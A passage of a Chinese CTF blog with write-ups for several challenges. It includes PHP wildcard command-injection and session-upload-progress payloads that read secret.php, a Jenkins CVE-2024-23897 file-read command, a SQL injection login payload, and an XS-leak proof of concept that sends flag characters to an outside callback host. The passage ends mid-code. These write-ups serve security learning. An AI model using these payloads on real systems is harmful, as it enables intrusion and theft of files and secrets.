+<p>我有个想法 他既然给了我们secret是不是构造什么 文件包含 去读取这个secret.php啊</p>
+<p>试了试，都不太行呀</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># payload = <span class="string">&quot;&#x27;.`. /???/?????????`.&#x27;&quot;</span></span><br><span class="line"># payload = <span class="string">&quot;&#x27;.`. /???/???/????/?????.???`.&#x27;&quot;</span></span><br><span class="line"># /proc/thread-self/fd/<span class="number">5</span></span><br><span class="line">payload = <span class="string">&quot;&#x27;.`ls -l /????/??????-????/??/??`.&#x27;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&#x27;.`. /proc/thread-self/??/??`.&#x27;&quot;</span></span><br><span class="line"># payload = <span class="string">&quot;&#x27;.`echo /????/??????-????/????????? /???/???/????/??????.???`.&#x27;&quot;</span></span><br><span class="line"># payload = <span class="string">&quot;&#x27;.`/????/??????-????/????????? /???/???/????/??????.???`.&#x27;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>我感觉自增是不可能了</p>
+<p>$_[];.()+</p>
+<p>最少都需要9+</p>
+<p>限制了</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;&#x27;;`/????`;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>这道题是独享还是共享 docker吗</p>
+<p>出了</p>
+<p>exp:</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /index.<span class="property">php</span> <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1003</span></span><br><span class="line"><span class="title class_">User</span>-<span class="title class_">Agent</span>: curl/<span class="number">8.1</span><span class="number">.2</span></span><br><span class="line"><span class="title class_">Accept</span>: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Cookie: PHPSESSID=123456789012345678901234567890123456789012345678</span></span><br><span class="line"><span class="comment">Content-Length: 17636</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=------------------------aa6600bbb1aa56a5</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--------------------------aa6600bbb1aa56a5</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment">cat /var/www/html/secret.php;exit;</span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment">--------------------------aa6600bbb1aa56a5</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;FILE&quot;; filename=&quot;123.php&quot;</span></span><br><span class="line"><span class="comment">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123123</span></span><br><span class="line"><span class="comment">--------------------------aa6600bbb1aa56a5--</span></span><br><span class="line"><span class="comment">GET /index.php?shout=&quot;&#x27;.`.+/???/?????????????????????????????????????????????????????`.&#x27;&quot; HTTP/1.1</span></span><br><span class="line"><span class="comment">Host: 127.0.0.1:1003</span></span><br><span class="line"><span class="comment">User-Agent: curl/8.1.2</span></span><br><span class="line"><span class="comment">Accept: */</span>*</span><br><span class="line"><span class="title class_">Cookie</span>: <span class="variable constant_">PHPSESSID</span>=<span class="number">123456789012345678901234567890123456789012345678</span></span><br></pre></td></tr></table></figure>
+
+<p>开两个intruder跑就行</p>
+
+      
+    </div>
+
+    
+    
+    
+	
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2024/02/05/RW-be/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/ch.jpg">
+      <meta itemprop="name" content="chleynx">
+      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="星河风">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/02/05/RW-be/" class="post-title-link" itemprop="url">RW-be</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-02-05 00:42:37 / 修改时间：00:51:24" itemprop="dateCreated datePublished" datetime="2024-02-05T00:42:37+08:00">2024-02-05</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/challenge/" itemprop="url" rel="index"><span itemprop="name">challenge</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Be-a-Security-Researcher"><a href="#Be-a-Security-Researcher" class="headerlink" title="Be-a-Security-Researcher"></a>Be-a-Security-Researcher</h1><p>开局login</p>
+<p><img src="/2024/02/05/RW-be/image-20240127234137808-1707064990173-1.png" alt="image-20240127234137808"></p>
+<p>弱密码，sql，ssti，xss—-no！</p>
+<p>看大佬漏洞复现：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/jenkins-cve-2024-23897.html">https://www.leavesongs.com/PENETRATION/jenkins-cve-2024-23897.html</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">C:\Users\18774\Desktop&gt;java -jar jenkins-cli.jar -s http://47.96.171.129:8080 who-am-i &quot;@/flag&quot;</span><br><span class="line"></span><br><span class="line">ERROR: No argument is allowed: **rwctf&#123;jenkins_no_vulner!!&#125;**</span><br><span class="line"></span><br><span class="line">java -jar jenkins-cli.jar who-am-i</span><br><span class="line"></span><br><span class="line">Reports your credential and permissions.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>ok！</p>
+
+      
+    </div>
+
+    
+    
+    
+	
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2024/02/05/IrisCTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/ch.jpg">
+      <meta itemprop="name" content="chleynx">
+      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="星河风">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/02/05/IrisCTF/" class="post-title-link" itemprop="url">IrisCTF</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-02-05 00:39:11 / 修改时间：00:40:44" itemprop="dateCreated datePublished" datetime="2024-02-05T00:39:11+08:00">2024-02-05</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/challenge/" itemprop="url" rel="index"><span itemprop="name">challenge</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="What’s-My-Password"><a href="#What’s-My-Password" class="headerlink" title="What’s My Password"></a>What’s My Password</h2><p>sql injection</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;skat&quot;,&quot;password&quot;:&quot;\&quot; union select username,password from users where username=\&quot;skat\&quot;#&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="LameNote"><a href="#LameNote" class="headerlink" title="LameNote"></a>LameNote</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Note challenges are lame so I made a lamer one. Flag matches irisctf&#123;[a-z_]+&#125;</span><br><span class="line"></span><br><span class="line">Admin will log in, make a note with the flag, then visit your link. (Sorry if the timeout is a bit broken on this challenge, there&#x27;s no PoW on the admin bot so feel free to spam it a bit)</span><br><span class="line"></span><br><span class="line">nc lamenote-adminbot.chal.irisc.tf 10300</span><br><span class="line"></span><br><span class="line">Hint!</span><br><span class="line">Please redownload if you downloaded server files at the start of the event.</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://prod-files-secure.s3.us-west-2.amazonaws.com/c378b070-6063-4137-81ee-f75f82009b81/e71696da-6929-44f6-843a-ade7f472026a/lamenote.tar.gz">lamenote.tar.gz</a></p>
+<p><a target="_blank" rel="noopener" href="https://prod-files-secure.s3.us-west-2.amazonaws.com/c378b070-6063-4137-81ee-f75f82009b81/d843f21b-391a-4c6a-9022-f34c2e512058/lamenote-adminbot.tar.gz">lamenote-adminbot.tar.gz</a></p>
+<p>maybe <a target="_blank" rel="noopener" href="https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks">https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks</a></p>
+<p>trying…</p>
+<p>there is always response 200, so seems like not this</p>
+<p>Got idea: In our resourse need make bot to create a new note with content <strong>irisctf{a</strong> and with img url to <strong>any webhook</strong>, then in iframe open the <em><strong>&#x2F;search?query&#x3D;irisctf{a</strong></em></p>
+<ul>
+<li>if there is only our note matches then server will open our note and request to our webhook</li>
+<li>if there is more than 1 note with “irisctf{a” then response will be just urls of notes, no request to webhook, so we can extract the symbol of flag</li>
+</ul>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> <span class="title class_">Flask</span>, make_response, request</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask_cors <span class="keyword">import</span> <span class="variable constant_">CORS</span></span><br><span class="line"></span><br><span class="line">app = <span class="title class_">Flask</span>(__name__)</span><br><span class="line"><span class="title function_">CORS</span>(app)</span><br><span class="line">callbacks = []</span><br><span class="line">temp = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;iframe name=&quot;</span>test<span class="string">&quot; style=&quot;</span><span class="attr">display</span>:none;<span class="string">&quot;&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">    &lt;iframe name=&quot;</span>test2<span class="string">&quot; style=&quot;</span><span class="attr">display</span>:none;<span class="string">&quot;&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">    &lt;form action=&quot;</span>&lt;<span class="attr">https</span>:<span class="comment">//lamenote-web.chal.irisc.tf/create&gt;&quot; method=&quot;POST&quot; target=&quot;test&quot;&gt;</span></span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;title&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Flag&quot;</span> /&gt;</span></span></span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;irisctf<span class="symbol">&amp;#123;</span>&#123;&#125;&quot;</span> /&gt;</span></span></span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;image&quot;</span> <span class="attr">value</span>=<span class="string">&quot;https<span class="symbol">&amp;#58;</span><span class="symbol">&amp;#47;</span><span class="symbol">&amp;#47;</span>edu<span class="symbol">&amp;#46;</span>ghost1032<span class="symbol">&amp;#46;</span>top/callback<span class="symbol">&amp;#63;</span>callback<span class="symbol">&amp;#61;</span>&#123;&#125;&amp;index=&#123;&#125;&quot;</span> /&gt;</span></span></span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span></span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    </span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&lt;https://lamenote-web.chal.irisc.tf/search&gt;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span> <span class="attr">target</span>=<span class="string">&quot;test2&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;query&quot;</span> <span class="attr">value</span>=<span class="string">&quot;irisctf<span class="symbol">&amp;#123;</span>&#123;&#125;&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">1</span>].<span class="title function_">submit</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">@app.route(&#x27;/leak/&lt;i&gt;/&lt;string&gt;&#x27;)</span></span><br><span class="line"><span class="string">def index(i,string):</span></span><br><span class="line"><span class="string">    return make_response(temp.format(string, string, i , string))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.route(&#x27;/callback&#x27;)</span></span><br><span class="line"><span class="string">def cb():</span></span><br><span class="line"><span class="string">    cb = request.args.get(&#x27;callback&#x27;) </span></span><br><span class="line"><span class="string">    index = int(request.args.get(&#x27;index&#x27;))</span></span><br><span class="line"><span class="string">    if len(callbacks) &lt;= index:</span></span><br><span class="line"><span class="string">        callbacks.append(&#123;&#125;)</span></span><br><span class="line"><span class="string">    if cb in callbacks[index]:</span></span><br><span class="line"><span class="string">        